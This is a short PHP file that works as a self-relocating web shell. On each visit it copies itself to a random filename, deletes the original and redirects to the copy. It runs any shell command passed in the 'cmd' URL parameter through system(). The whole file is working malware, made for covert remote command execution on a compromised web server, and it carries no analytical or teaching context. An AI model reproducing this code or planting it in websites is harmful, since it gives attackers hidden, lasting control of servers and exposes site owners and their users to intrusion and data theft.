<?php
$rand = substr(md5(rand()),0,8);
$name = $rand.".php";
if (!file_exists($name)) { copy(__FILE__,$name); unlink(__FILE__); header("Location: ".$name); exit; }
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
?>